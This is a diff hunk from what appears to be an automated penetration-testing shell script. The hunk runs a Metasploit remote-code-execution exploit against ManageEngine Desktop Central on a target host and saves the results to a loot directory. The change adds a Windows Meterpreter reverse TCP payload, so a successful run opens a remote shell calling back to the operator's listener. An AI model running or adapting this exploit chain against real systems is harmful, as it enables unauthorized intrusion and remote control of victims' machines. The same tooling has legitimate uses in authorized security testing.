@@ -28,7 +28,7 @@
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
       echo -e "$OKRED RUNNING MANAGEENGINE DESKTOP CENTRAL RCE EXPLOIT $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
-      msfconsole -q -x "use exploit/windows/http/manageengine_connectionid_write; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.raw
+      msfconsole -q -x "use exploit/windows/http/manageengine_connectionid_write; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; set PAYLOAD windows/meterpreter/reverse_tcp; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
